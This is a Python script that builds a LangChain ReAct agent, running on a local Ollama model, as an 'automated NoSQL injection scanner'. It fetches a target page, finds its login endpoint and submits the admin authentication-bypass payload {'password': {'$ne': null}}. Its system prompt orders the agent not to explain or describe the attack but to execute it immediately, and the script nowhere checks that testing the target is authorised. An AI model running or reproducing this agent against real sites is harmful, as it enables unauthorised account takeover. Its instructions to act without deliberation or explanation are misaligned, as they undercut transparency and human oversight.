import argparse
import asyncio
from langchain_ollama import ChatOllama


MODEL = "qwen3:14b"   # or any model you want

from typing import List, Dict, Any, Type, ClassVar
from pydantic import BaseModel
from langchain_community.agent_toolkits.base import BaseToolkit
from langchain_core.tools import BaseTool
from pydantic.v1 import Extra
from langchain_community.utilities import GoogleSerperAPIWrapper
from langchain_core.tools import Tool, tool

from langgraph.prebuilt import create_react_agent

import requests
from bs4 import BeautifulSoup

from typing import Annotated, Union
from langgraph.prebuilt.chat_agent_executor import AgentStateWithStructuredResponse

scanner_agent_prompt = """
You are an automated NoSQL Injection scanner. 
Your job is to use the provided tools to scan for vulnerabilities.

--- OBJECTIVE ---
1. Fetch the page HTML 
2. Find the login form endpoint (check JavaScript fetch() calls or form action)
3. Submit this payload to the endpoint:
   {{"username": "admin", "password": {{"$ne": null}}}}
4. Report the server response

--- CRITICAL RULES ---
• Use ReAct format: Thought → Action → Action Input
• After identifying the endpoint, IMMEDIATELY call submit_form tool
• Do NOT write explanations of what you WOULD do - actually DO it by calling tools
• Do NOT describe the payload or explain the attack - just execute it
• Keep thoughts brief (1-2 sentences max)
• After submit_form returns a response, that response is your final answer

--- BEHAVIOR ---
WRONG: "I should submit the payload to /login. The payload would be..."
RIGHT: Thought: I found endpoint /login. Submitting payload now.
       Action: submit_form
       Action Input: {{"url": "http://target.com/login", "data": {{"username": "admin", "password": {{"$ne": null}}}}}}

DO NOT explain, describe, or document the attack - EXECUTE it immediately.
"""


class PentestState(AgentStateWithStructuredResponse):
    should_terminate: bool
    reason: str
    url: str


search = GoogleSerperAPIWrapper()
search_tool = Tool(
    name="search",
    func=search.run,
    description="Use this to search the web for information",
)


class FetchPageArgs(BaseModel):
    url: str


class ExtractTextArgs(BaseModel):
    html: str


class ExtractHTMLArgs(BaseModel):
    html: str


class ExtractLinksArgs(BaseModel):
    html: str


class ParseFormArgs(BaseModel):
    html: str


class SubmitFormArgs(BaseModel):
    url: str
    data: Dict[str, Any] = {}


# --- Tools ---
class FetchPageTool(BaseTool):
    name: str = "fetch_page"
    description: str = "Fetches a web page HTML via GET request and returns the HTML as a string."
    args_schema: ClassVar[Type[BaseModel]] = FetchPageArgs

    def _run(self, url: str) -> str:
        response = requests.get(url)
        response.raise_for_status()
        return response.text

    async def _arun(self, url: str) -> str:
        return self._run(url)


class ParseFormTool(BaseTool):
    name: str = "parse_form"
    description: str = "Parses the first form in HTML and returns a dictionary of input names and default values."
    args_schema: ClassVar[Type[BaseModel]] = ParseFormArgs

    def _run(self, html: str) -> Dict[str, str]:
        soup = BeautifulSoup(html, "html.parser")
        form = soup.find("form")
        if not form:
            return {}
        inputs = form.find_all("input")
        return {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}

    async def _arun(self, html: str) -> Dict[str, str]:
        return self._run(html)


class SubmitFormTool(BaseTool):
    name: str = "submit_form"
    description: str = "Submits a POST request to a form URL with given data. Automatically detects if JSON should be used based on URL. Args: url, data (dict)."
    args_schema: ClassVar[Type[BaseModel]] = SubmitFormArgs

    def _run(self, url: str, data: Dict[str, Any] = {}) -> str:
        response = requests.post(url, json=data)
        return f"Status: {response.status_code}\nResponse: {response.text}"

    async def _arun(self, url: str, data: Dict[str, Any] = {}) -> str:
        return self._run(url, data)


class Toolkit(BaseToolkit):
    """
    Replacement PlayWrightBrowserToolkit for AI agents.
    Uses requests/BeautifulSoup instead of a full browser.
    """

    class Config:
        extra = Extra.forbid
        arbitrary_types_allowed = True

    def get_tools(self) -> List[BaseTool]:
        return [
            FetchPageTool(),
            ParseFormTool(),
            SubmitFormTool(),
        ]


async def scanner_tools(target_url: str):
    """Return tools from your custom toolkit with target URL enforced."""
    base_tools = Toolkit().get_tools()
    
    # Wrap the fetch_page tool to enforce the target URL
    original_fetch = None
    for tool in base_tools:
        if tool.name == "fetch_page":
            original_fetch = tool
            break
    
    # Create a wrapper that validates URLs
    class ValidatedFetchPageTool(BaseTool):
        name: str = "fetch_page"
        description: str = f"Fetches the target web page HTML. You must use the target URL: {target_url}"
        args_schema: ClassVar[Type[BaseModel]] = FetchPageArgs

        def _run(self, url: str) -> str:
            # Force the correct URL if agent tries to use wrong one
            if url != target_url and not url.startswith(target_url):
                print(f"[!] Agent tried to fetch {url}, redirecting to {target_url}")
                url = target_url
            
            response = requests.get(url)
            response.raise_for_status()
            return response.text

        async def _arun(self, url: str) -> str:
            return self._run(url)
    
    # Replace fetch_page with validated version
    validated_tools = [tool for tool in base_tools if tool.name != "fetch_page"]
    validated_tools.insert(0, ValidatedFetchPageTool())
    
    return validated_tools + [search_tool]


async def main():
    parser = argparse.ArgumentParser(description="NoSQL injection scanner demo")
    parser.add_argument("url", help="Target URL to scan")
    args = parser.parse_args()

    target_url = args.url
    
    # Validate URL format
    if not target_url.startswith(('http://', 'https://')):
        print(f"[!] Warning: URL should start with http:// or https://")
        print(f"[*] Attempting to use: {target_url}")

    # -------- Initialize tools --------
    tools = await scanner_tools(target_url)

    # -------- Create agent with URL embedded in prompt --------
    # Inject the actual URL directly into the system prompt
    custom_prompt = scanner_agent_prompt + f"""

=== IMPORTANT: TARGET URL ===
The target URL you must scan is: {target_url}

Every time you call fetch_page, you MUST use this URL: {target_url}
Do NOT use example.com, do NOT use any other URL.
The ONLY valid URL for this scan is: {target_url}
"""
    
    agent = create_react_agent(
        model=ChatOllama(model=MODEL),
        prompt=custom_prompt,
        name="scanner_agent",
        tools=tools,
        state_schema=PentestState,
        debug=True,
    )

    # -------- Agent task instructions --------
    # Simple, direct instruction
    task = f"""
Scan {target_url} for NoSQL injection.

Execute these steps by calling tools (not describing them):
1. fetch_page 
2. Find login endpoint from HTML/JavaScript
3. submit_form with payload {{"username": "admin", "password": {{"$ne": null}}}}

Begin.
"""

    print(f"[*] Target URL: {target_url}")
    print("[*] Running agent...\n")

    try:
        result = await agent.ainvoke({"input": task, "url": target_url})

        print("\n=== Final Output ===\n")
        print(result["output"])
    except Exception as e:
        print(f"\n[!] Error during scan: {str(e)}")


if __name__ == "__main__":
    asyncio.run(main())